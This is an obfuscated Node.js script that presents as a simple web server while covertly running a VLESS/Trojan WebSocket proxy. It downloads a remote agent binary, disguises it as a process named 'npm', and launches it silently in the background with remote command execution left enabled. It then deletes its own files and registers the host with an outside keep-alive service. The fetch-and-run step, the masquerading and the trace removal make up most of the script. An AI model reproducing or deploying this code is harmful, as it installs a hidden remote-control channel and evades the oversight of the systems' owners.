const _0x1ea5da=_0x5218;(function(_0x31ba80,_0x2c1dff){const _0x2875b6=_0x5218,_0x15aacd=_0x31ba80();while(!![]){try{const _0x4ea264=-parseInt(_0x2875b6(0x20f))/0x1*(parseInt(_0x2875b6(0x1b3))/0x2)+-parseInt(_0x2875b6(0x1d1))/0x3*(parseInt(_0x2875b6(0x1b2))/0x4)+-parseInt(_0x2875b6(0x1cf))/0x5*(parseInt(_0x2875b6(0x1fe))/0x6)+-parseInt(_0x2875b6(0x205))/0x7*(parseInt(_0x2875b6(0x1d3))/0x8)+parseInt(_0x2875b6(0x1d7))/0x9+-parseInt(_0x2875b6(0x1a3))/0xa*(-parseInt(_0x2875b6(0x1e3))/0xb)+-parseInt(_0x2875b6(0x1b8))/0xc*(-parseInt(_0x2875b6(0x1cd))/0xd);if(_0x4ea264===_0x2c1dff)break;else _0x15aacd['push'](_0x15aacd['shift']());}catch(_0x5e729c){_0x15aacd['push'](_0x15aacd['shift']());}}}(_0x5c64,0x7ce3e));const os=require('os'),http=require(_0x1ea5da(0x1fc)),fs=require('fs'),axios=require(_0x1ea5da(0x1c3)),net=require(_0x1ea5da(0x1c2)),path=require(_0x1ea5da(0x20c)),crypto=require(_0x1ea5da(0x1b7)),{Buffer}=require(_0x1ea5da(0x1ee)),{exec,execSync}=require(_0x1ea5da(0x1c8)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x1ea5da(0x20a)][_0x1ea5da(0x20d)]||_0x1ea5da(0x19c),NEZHA_SERVER=process['env'][_0x1ea5da(0x1a2)]||'',NEZHA_PORT=process[_0x1ea5da(0x20a)][_0x1ea5da(0x1aa)]||'',NEZHA_KEY=process[_0x1ea5da(0x20a)]['NEZHA_KEY']||'',DOMAIN=process['env'][_0x1ea5da(0x1dc)]||_0x1ea5da(0x1c4),AUTO_ACCESS=process[_0x1ea5da(0x20a)][_0x1ea5da(0x1f4)]||!![],WSPATH=process[_0x1ea5da(0x20a)][_0x1ea5da(0x1ad)]||UUID['slice'](0x0,0x8),SUB_PATH=process['env'][_0x1ea5da(0x1b6)]||'sub',NAME=process[_0x1ea5da(0x20a)][_0x1ea5da(0x213)]||_0x1ea5da(0x1c6),PORT=process[_0x1ea5da(0x20a)][_0x1ea5da(0x1ed)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x58154b=_0x1ea5da;try{const _0x390bd7=await axios['get'](_0x58154b(0x1b5)),_0x5e1218=_0x390bd7[_0x58154b(0x19a)];ISP=(_0x5e1218[_0x58154b(0x1ec)]+'-'+_0x5e1218[_0x58154b(0x1d8)])['replace'](/ /g,'_');}catch(_0x163e8c){ISP=_0x58154b(0x1a4);}};GetISP();const httpServer=http[_0x1ea5da(0x1e7)]((_0x3fc572,_0x15517f)=>{const _0x1cbd99=_0x1ea5da;if(_0x3fc572[_0x1cbd99(0x1dd)]==='/'){const _0x14e378=path[_0x1cbd99(0x1a5)](__dirname,_0x1cbd99(0x1c5));fs[_0x1cbd99(0x1df)](_0x14e378,_0x1cbd99(0x1c0),(_0x115172,_0x127b57)=>{const _0xbe7a12=_0x1cbd99;if(_0x115172){_0x15517f[_0xbe7a12(0x1db)](0xc8,{'Content-Type':_0xbe7a12(0x1d9)}),_0x15517f[_0xbe7a12(0x1e9)](_0xbe7a12(0x1a9));return;}_0x15517f[_0xbe7a12(0x1db)](0xc8,{'Content-Type':_0xbe7a12(0x1d9)}),_0x15517f[_0xbe7a12(0x1e9)](_0x127b57);});return;}else{if(_0x3fc572['url']==='/'+SUB_PATH){const _0x3be86d='vless://'+UUID+'@'+DOMAIN+_0x1cbd99(0x1d4)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x164867='trojan://'+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x1cbd99(0x1f1)+DOMAIN+_0x1cbd99(0x1ac)+WSPATH+'#'+NAME+'-'+ISP,_0x578fe1=_0x3be86d+'\x0a'+_0x164867,_0x49ee95=Buffer[_0x1cbd99(0x214)](_0x578fe1)[_0x1cbd99(0x1cc)]('base64');_0x15517f['writeHead'](0xc8,{'Content-Type':_0x1cbd99(0x200)}),_0x15517f['end'](_0x49ee95+'\x0a');}else _0x15517f[_0x1cbd99(0x1db)](0x194,{'Content-Type':'text/plain'}),_0x15517f[_0x1cbd99(0x1e9)](_0x1cbd99(0x1e6));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x1ea5da(0x1f6)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x1ea5da(0x1f3)];function resolveHost(_0x39c60f){return new Promise((_0xea856e,_0x1437eb)=>{const _0x267c8e=_0x5218;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x267c8e(0x212)](_0x39c60f)){_0xea856e(_0x39c60f);return;}let _0x10e04a=0x0;function _0x274828(){const _0x4ee444=_0x267c8e;if(_0x10e04a>=DNS_SERVERS['length']){_0x1437eb(new Error(_0x4ee444(0x218)+_0x39c60f+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x231f38=DNS_SERVERS[_0x10e04a];_0x10e04a++;const _0x3af235='https://dns.google/resolve?name='+encodeURIComponent(_0x39c60f)+_0x4ee444(0x201);axios[_0x4ee444(0x1bf)](_0x3af235,{'timeout':0x1388,'headers':{'Accept':_0x4ee444(0x1a7)}})[_0x4ee444(0x1ae)](_0x46b01d=>{const _0xe4374e=_0x4ee444,_0x4c387d=_0x46b01d[_0xe4374e(0x19a)];if(_0x4c387d['Status']===0x0&&_0x4c387d[_0xe4374e(0x1cb)]&&_0x4c387d[_0xe4374e(0x1cb)][_0xe4374e(0x1ff)]>0x0){const _0x4ad51d=_0x4c387d[_0xe4374e(0x1cb)][_0xe4374e(0x1c7)](_0x42832a=>_0x42832a[_0xe4374e(0x1ca)]===0x1);if(_0x4ad51d){_0xea856e(_0x4ad51d[_0xe4374e(0x19a)]);return;}}_0x274828();})['catch'](_0x5cabfc=>{_0x274828();});}_0x274828();});}function handleVlessConnection(_0x25e623,_0x2a5b80){const _0x377d87=_0x1ea5da,[_0x38e472]=_0x2a5b80,_0x586e6e=_0x2a5b80[_0x377d87(0x1ab)](0x1,0x11);if(!_0x586e6e['every']((_0x4395a0,_0x3a82f3)=>_0x4395a0==parseInt(uuid[_0x377d87(0x1e0)](_0x3a82f3*0x2,0x2),0x10)))return![];let _0x353711=_0x2a5b80[_0x377d87(0x1ab)](0x11,0x12)[_0x377d87(0x1a1)]()+0x13;const _0x41be8c=_0x2a5b80[_0x377d87(0x1ab)](_0x353711,_0x353711+=0x2)[_0x377d87(0x1be)](0x0),_0x1bc345=_0x2a5b80['slice'](_0x353711,_0x353711+=0x1)['readUInt8'](),_0x11993e=_0x1bc345==0x1?_0x2a5b80['slice'](_0x353711,_0x353711+=0x4)['join']('.'):_0x1bc345==0x2?new TextDecoder()[_0x377d87(0x202)](_0x2a5b80['slice'](_0x353711+0x1,_0x353711+=0x1+_0x2a5b80['slice'](_0x353711,_0x353711+0x1)[_0x377d87(0x1a1)]())):_0x1bc345==0x3?_0x2a5b80[_0x377d87(0x1ab)](_0x353711,_0x353711+=0x10)[_0x377d87(0x19d)]((_0x211da2,_0xad2a55,_0x23494e,_0x20d524)=>_0x23494e%0x2?_0x211da2[_0x377d87(0x1f7)](_0x20d524[_0x377d87(0x1ab)](_0x23494e-0x1,_0x23494e+0x1)):_0x211da2,[])[_0x377d87(0x1fa)](_0x59e800=>_0x59e800['readUInt16BE'](0x0)[_0x377d87(0x1cc)](0x10))['join'](':'):'';_0x25e623['send'](new Uint8Array([_0x38e472,0x0]));const _0x108689=createWebSocketStream(_0x25e623);return resolveHost(_0x11993e)[_0x377d87(0x1ae)](_0x1f786b=>{const _0x1e694c=_0x377d87;net[_0x1e694c(0x1fd)]({'host':_0x1f786b,'port':_0x41be8c},function(){const _0x1a8f14=_0x1e694c;this['write'](_0x2a5b80[_0x1a8f14(0x1ab)](_0x353711)),_0x108689['on'](_0x1a8f14(0x1e2),()=>{})[_0x1a8f14(0x1a0)](this)['on'](_0x1a8f14(0x1e2),()=>{})[_0x1a8f14(0x1a0)](_0x108689);})['on']('error',()=>{});})['catch'](_0x116120=>{const _0x2dbd8e=_0x377d87;net['connect']({'host':_0x11993e,'port':_0x41be8c},function(){const _0x376dea=_0x5218;this[_0x376dea(0x1a8)](_0x2a5b80['slice'](_0x353711)),_0x108689['on'](_0x376dea(0x1e2),()=>{})['pipe'](this)['on'](_0x376dea(0x1e2),()=>{})[_0x376dea(0x1a0)](_0x108689);})['on'](_0x2dbd8e(0x1e2),()=>{});}),!![];}function handleTrojanConnection(_0x3b3a09,_0x1c3a74){const _0x39376d=_0x1ea5da;try{if(_0x1c3a74[_0x39376d(0x1ff)]<0x3a)return![];const _0x9a815d=_0x1c3a74['slice'](0x0,0x38)[_0x39376d(0x1cc)](),_0x3da8a7=[UUID];let _0x81be31=null;for(const _0x5ed530 of _0x3da8a7){const _0x53de80=crypto['createHash'](_0x39376d(0x1bb))[_0x39376d(0x1b9)](_0x5ed530)[_0x39376d(0x1f0)](_0x39376d(0x19b));if(_0x53de80===_0x9a815d){_0x81be31=_0x5ed530;break;}}if(!_0x81be31)return![];let _0x1ef997=0x38;_0x1c3a74[_0x1ef997]===0xd&&_0x1c3a74[_0x1ef997+0x1]===0xa&&(_0x1ef997+=0x2);const _0x129212=_0x1c3a74[_0x1ef997];if(_0x129212!==0x1)return![];_0x1ef997+=0x1;const _0x5e4b64=_0x1c3a74[_0x1ef997];_0x1ef997+=0x1;let _0x13915d,_0x58202c;if(_0x5e4b64===0x1)_0x13915d=_0x1c3a74[_0x39376d(0x1ab)](_0x1ef997,_0x1ef997+0x4)[_0x39376d(0x1a5)]('.'),_0x1ef997+=0x4;else{if(_0x5e4b64===0x3){const _0x5a1ec8=_0x1c3a74[_0x1ef997];_0x1ef997+=0x1,_0x13915d=_0x1c3a74[_0x39376d(0x1ab)](_0x1ef997,_0x1ef997+_0x5a1ec8)[_0x39376d(0x1cc)](),_0x1ef997+=_0x5a1ec8;}else{if(_0x5e4b64===0x4)_0x13915d=_0x1c3a74[_0x39376d(0x1ab)](_0x1ef997,_0x1ef997+0x10)['reduce']((_0x1f0b8d,_0x4f47c4,_0x546398,_0x4418b9)=>_0x546398%0x2?_0x1f0b8d[_0x39376d(0x1f7)](_0x4418b9[_0x39376d(0x1ab)](_0x546398-0x1,_0x546398+0x1)):_0x1f0b8d,[])[_0x39376d(0x1fa)](_0x412fb9=>_0x412fb9[_0x39376d(0x1be)](0x0)[_0x39376d(0x1cc)](0x10))[_0x39376d(0x1a5)](':'),_0x1ef997+=0x10;else return![];}}_0x58202c=_0x1c3a74['readUInt16BE'](_0x1ef997),_0x1ef997+=0x2;_0x1ef997<_0x1c3a74[_0x39376d(0x1ff)]&&_0x1c3a74[_0x1ef997]===0xd&&_0x1c3a74[_0x1ef997+0x1]===0xa&&(_0x1ef997+=0x2);const _0x35bb43=createWebSocketStream(_0x3b3a09);return resolveHost(_0x13915d)[_0x39376d(0x1ae)](_0x438d75=>{const _0x164415=_0x39376d;net[_0x164415(0x1fd)]({'host':_0x438d75,'port':_0x58202c},function(){const _0x1cd41d=_0x164415;_0x1ef997<_0x1c3a74['length']&&this[_0x1cd41d(0x1a8)](_0x1c3a74['slice'](_0x1ef997)),_0x35bb43['on']('error',()=>{})[_0x1cd41d(0x1a0)](this)['on'](_0x1cd41d(0x1e2),()=>{})[_0x1cd41d(0x1a0)](_0x35bb43);})['on'](_0x164415(0x1e2),()=>{});})[_0x39376d(0x1d0)](_0x50187a=>{const _0x279fe4=_0x39376d;net[_0x279fe4(0x1fd)]({'host':_0x13915d,'port':_0x58202c},function(){const _0x21a083=_0x279fe4;_0x1ef997<_0x1c3a74[_0x21a083(0x1ff)]&&this[_0x21a083(0x1a8)](_0x1c3a74[_0x21a083(0x1ab)](_0x1ef997)),_0x35bb43['on'](_0x21a083(0x1e2),()=>{})[_0x21a083(0x1a0)](this)['on'](_0x21a083(0x1e2),()=>{})[_0x21a083(0x1a0)](_0x35bb43);})['on'](_0x279fe4(0x1e2),()=>{});}),!![];}catch(_0x13779e){return![];}}wss['on'](_0x1ea5da(0x1c1),(_0x2d34b2,_0x2cd3e1)=>{const _0x29f809=_0x1ea5da,_0x2a0486=_0x2cd3e1['url']||'';_0x2d34b2[_0x29f809(0x1de)](_0x29f809(0x20b),_0x1adf77=>{const _0x334100=_0x29f809;if(_0x1adf77['length']>0x11&&_0x1adf77[0x0]===0x0){const _0x24a30a=_0x1adf77[_0x334100(0x1ab)](0x1,0x11),_0x5cf2c3=_0x24a30a[_0x334100(0x1c9)]((_0x51b33a,_0x19c2b1)=>_0x51b33a==parseInt(uuid['substr'](_0x19c2b1*0x2,0x2),0x10));if(_0x5cf2c3){!handleVlessConnection(_0x2d34b2,_0x1adf77)&&_0x2d34b2[_0x334100(0x1ba)]();return;}}!handleTrojanConnection(_0x2d34b2,_0x1adf77)&&_0x2d34b2[_0x334100(0x1ba)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x1e0b51=_0x1ea5da,_0x171b97=os['arch']();return _0x171b97===_0x1e0b51(0x1f2)||_0x171b97===_0x1e0b51(0x211)||_0x171b97==='aarch64'?!NEZHA_PORT?_0x1e0b51(0x19f):_0x1e0b51(0x1b0):!NEZHA_PORT?_0x1e0b51(0x1bc):_0x1e0b51(0x206);},downloadFile=async()=>{const _0x3807a3=_0x1ea5da;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x306482=getDownloadUrl(),_0x296d46=await axios({'method':'get','url':_0x306482,'responseType':'stream'}),_0x1fdea9=fs['createWriteStream'](_0x3807a3(0x20e));return _0x296d46[_0x3807a3(0x19a)][_0x3807a3(0x1a0)](_0x1fdea9),new Promise((_0x35dc05,_0x52af1b)=>{const _0x49bcce=_0x3807a3;_0x1fdea9['on'](_0x49bcce(0x1ce),()=>{const _0x239639=_0x49bcce;console[_0x239639(0x1ea)](_0x239639(0x217)),exec(_0x239639(0x1e1),_0x2c414a=>{if(_0x2c414a)_0x52af1b(_0x2c414a);_0x35dc05();});}),_0x1fdea9['on'](_0x49bcce(0x1e2),_0x52af1b);});}catch(_0x3541b1){throw _0x3541b1;}},runnz=async()=>{const _0x4ae720=_0x1ea5da;try{const _0x44bcb5=execSync(_0x4ae720(0x204),{'encoding':_0x4ae720(0x1d5)});if(_0x44bcb5['trim']()!==''){console[_0x4ae720(0x1ea)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x11f5d0){}await downloadFile();let _0x4f6ef1='',_0x2fd736=[_0x4ae720(0x210),_0x4ae720(0x1b1),_0x4ae720(0x1bd),'2087',_0x4ae720(0x1ef),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x481b08=_0x2fd736['includes'](NEZHA_PORT)?_0x4ae720(0x1e8):'';_0x4f6ef1='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x4ae720(0x1f9)+NEZHA_KEY+'\x20'+_0x481b08+_0x4ae720(0x1f8);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1791d5=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x4ae720(0x207)]():'',_0x164c90=_0x2fd736['includes'](_0x1791d5)?'true':_0x4ae720(0x1f5),_0x523673=_0x4ae720(0x1d6)+NEZHA_KEY+_0x4ae720(0x1d2)+NEZHA_SERVER+_0x4ae720(0x19e)+_0x164c90+_0x4ae720(0x215)+UUID;fs['writeFileSync'](_0x4ae720(0x1a6),_0x523673);}_0x4f6ef1=_0x4ae720(0x208);}else{console[_0x4ae720(0x1ea)](_0x4ae720(0x1af));return;}}try{exec(_0x4f6ef1,{'shell':_0x4ae720(0x209)},_0x3c53eb=>{const _0x127ad1=_0x4ae720;if(_0x3c53eb)console[_0x127ad1(0x1e2)](_0x127ad1(0x216),_0x3c53eb);else console[_0x127ad1(0x1ea)](_0x127ad1(0x1e4));});}catch(_0x1dd89e){console['error'](_0x4ae720(0x1e5)+_0x1dd89e);}};async function addAccessTask(){const _0x52c638=_0x1ea5da;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x561606=_0x52c638(0x1b4)+DOMAIN;try{const _0x3c9157=await axios['post'](_0x52c638(0x1da),{'url':_0x561606},{'headers':{'Content-Type':'application/json'}});console['log'](_0x52c638(0x203));}catch(_0x3c7874){}}const delFiles=()=>{const _0x172e76=_0x1ea5da;fs[_0x172e76(0x1fb)](_0x172e76(0x20e),()=>{}),fs[_0x172e76(0x1fb)](_0x172e76(0x1a6),()=>{});};function _0x5218(_0x10a98e,_0x1c7e4c){const _0x5c6457=_0x5c64();return _0x5218=function(_0x5218c8,_0x2efbec){_0x5218c8=_0x5218c8-0x19a;let _0x3cc460=_0x5c6457[_0x5218c8];return _0x3cc460;},_0x5218(_0x10a98e,_0x1c7e4c);}function _0x5c64(){const _0x3ac2d1=['&fp=chrome&type=ws&host=','arm','1.1.1.1','AUTO_ACCESS','false','replace','concat','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x20-p\x20','map','unlink','http','connect','94434HMSpCB','length','text/plain','&type=A','decode','Automatic\x20Access\x20Task\x20added\x20successfully','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','33327lCLLpX','https://amd64.ssss.nyc.mn/agent','pop','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','/bin/bash','env','message','path','UUID','npm','52069OQzgBo','443','arm64','test','NAME','from','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','npm\x20running\x20error:','npm\x20download\x20successfully','Failed\x20to\x20resolve\x20','data','hex','82cc7bbf-d797-42d8-a90b-b717d4f0d344','reduce','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','https://arm64.ssss.nyc.mn/v1','pipe','readUInt8','NEZHA_SERVER','1561180gemlXV','Unknown','join','config.yaml','application/dns-json','write','Hello\x20world!','NEZHA_PORT','slice','&path=%2F','WSPATH','then','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','https://arm64.ssss.nyc.mn/agent','8443','1512844XlKFTC','34BGRoxu','https://','https://speed.cloudflare.com/meta','SUB_PATH','crypto','12sOiAGD','update','close','sha224','https://amd64.ssss.nyc.mn/v1','2096','readUInt16BE','get','utf8','connection','net','axios','1234.abc.com','index.html','Hug','find','child_process','every','type','Answer','toString','32562153kGNFTY','finish','135CxolJG','catch','3BDtHUz','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','904XWQkQx',':443?encryption=none&security=tls&sni=','utf-8','client_secret:\x20','692829PAWWeh','asOrganization','text/html','https://oooo.serv00.net/add-url','writeHead','DOMAIN','url','once','readFile','substr','chmod\x20+x\x20npm','error','11eUlSsj','npm\x20is\x20running','error:\x20','Not\x20Found\x0a','createServer','--tls','end','log','Server\x20is\x20running\x20on\x20port\x20','country','PORT','buffer','2083','digest'];_0x5c64=function(){return _0x3ac2d1;};return _0x5c64();}httpServer['listen'](PORT,()=>{const _0x314b63=_0x1ea5da;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x314b63(0x1ea)](_0x314b63(0x1eb)+PORT);});
